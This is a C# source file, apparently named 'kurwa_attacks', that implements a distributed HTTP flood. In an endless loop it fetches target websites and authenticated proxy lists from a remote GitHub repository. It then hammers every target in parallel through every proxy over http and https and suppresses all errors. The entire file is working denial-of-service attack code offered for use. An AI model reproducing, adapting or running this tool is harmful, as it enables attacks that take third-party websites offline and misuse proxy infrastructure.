
using System.Net;
using CloudFlareUtilities;
using kurwa_attacks.Models;
using Newtonsoft.Json;

try
{
    var i = 0;
    while (true)
    {
        var resources = await GetResoures();

        Parallel.ForEach(resources.Sites, async (site) =>
        {
            await Attack(site, resources.Proxies, "http");
            await Attack(site, resources.Proxies, "https");
        });

        i++;
    }
    
}
catch (Exception ex)
{
    Console.WriteLine(ex.Message);
}

async Task<Resourses> GetResoures()
{
    var resources = new Resourses();
    using (var client = new HttpClient())
    {
        var resp = await client.GetAsync("https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json");

        resources.Sites = JsonConvert.DeserializeObject<List<Site>>(await resp.Content.ReadAsStringAsync());

        resp = await client.GetAsync("https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json");

        resources.Proxies = JsonConvert.DeserializeObject<List<Proxy>>(await resp.Content.ReadAsStringAsync());

        return resources;
    }
}


async Task Attack(Site site, List<Proxy> proxies, string protocol)
{

    try
    {
        Parallel.ForEach(proxies, async (proxy) =>
        {
            var proxyurl = $"{proxy.Ip}";

            var username = proxy.Auth.Split(":")[0];
            var password = proxy.Auth.Split(":")[1];

            try
            {
                var handler = new HttpClientHandler { UseProxy = true };

                ICredentials credentials = new NetworkCredential(username, password);

                handler.Proxy = new WebProxy(proxyurl, true, null, credentials);
                using (var client = new HttpClient(handler))
                {
                    client.Timeout = new TimeSpan(100000000);
                    var resp = client.GetAsync(site.Page);

                    Console.WriteLine($"SUCCESS {site.Page}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"{site.Page} {ex.Message} " );
            }
        });
    }
    catch (Exception ex)
    {
       
    }

}



